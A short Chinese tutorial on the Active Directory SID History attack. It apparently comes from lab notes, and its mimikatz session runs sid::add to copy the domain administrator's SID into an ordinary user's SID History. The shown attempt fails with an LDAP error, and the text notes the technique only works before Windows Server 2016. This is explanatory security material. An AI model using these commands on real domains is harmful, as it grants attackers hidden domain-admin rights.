每个账户都有独一无二的SID标识符，活动目标中对象的objectSid属性值就是SID。

如果将A域的用户迁移到B域，在B域的SID随之改变，导致迁移后的用户无法访问原来的资源。而SID History是为了域迁移场景设置的属性，他使得账户原本访问权限能有效克隆到另一个账号。在用户访问资源的时候，SID和SID History都会被添加到用户的访问令牌中。

# 一、SID History攻击
普通域用户: sec\hack

hack用户并非域管，所以无权添加用户或添加域管用户组的用户

当我们获得域管权限时。可以把域管administrator的SID添加到hack的SID HISTORY属性里

```plain
C:\Users\Administrator.SEC\Desktop\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sid::add /sam:hack /new:administrator

CN=hack,CN=Users,DC=sec,DC=local
  name: hack
  objectGUID: {ffcf369c-f642-41b9-a752-202e8fe174b1}
  objectSid: S-1-5-21-2066713137-2133816201-3751750268-1103
  sAMAccountName: hack

  * Will try to add 'sIDHistory' this new SID:'S-1-5-21-2066713137-2133816201-3751750268-500': ERROR kuhl_m_sid_add ; ldap_modify_s 0x32 (50)

mimikatz #
```

注：Windows Server 2016之前的版本才能成功